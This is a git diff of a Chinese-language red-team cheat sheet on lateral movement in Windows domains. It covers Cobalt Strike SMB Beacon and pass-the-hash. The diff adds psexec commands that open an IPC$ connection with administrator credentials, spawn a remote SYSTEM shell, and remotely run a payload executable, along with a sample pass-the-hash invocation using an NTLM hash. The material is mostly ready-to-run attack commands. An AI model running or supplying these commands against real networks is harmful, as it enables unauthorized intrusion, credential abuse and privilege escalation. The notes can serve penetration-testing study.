@@ -14,7 +14,8 @@
     psexec.exe -accepteula \\192.168.41.150 -h -d c:\wanli.exe
     
     如果发现很久没有上线，可能目标不出网
- ## 0x01 横向移动方法总结2_beacon
+
+## 0x01 横向移动方法总结2_beacon
  
     SMB Beacon使用命名管道和父级命名管道进行通信,所以利用他可进行横向移动
     
@@ -23,7 +24,21 @@
     使用SMB的主机必修接受445端口打开
     只能链接由同一Cobalt Strike实例管理的Beacon
 ## 0x02 横向移动方法3_PTH攻击
-    前提开启445端口
+
+    psexec工具功能之一是远程启动交互式shell,这个工具不需要对方开启3389端口，只需要开启admin$共享即可。
+    
+    使用方法1
+    
+    1.psexec 需要建立ipc连接进行横向移动
+    
+     net use \\192.168.3.144\ip$ “admin!@#45” /uesr:administrator  #建立IPC链接，出现弹框点击agree
+     psexec \\192.168.3.64 -s cmd cmd  #-s,表示以system权限运行窗口，成功返回目标主机system权限窗口
+     
+    2.ps不需要建立ipc连接进行横向移动
+    
+     psexec \\192.168.3.144 -u administrator -p admin123！！ -s cmd
+     
+     注意官方自带的psexec只能通过明文进行传递攻击，密码是行不通的，例如 psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.144 是不可以的
 
 ## 0x03 横向移动方法4_票据攻击
 
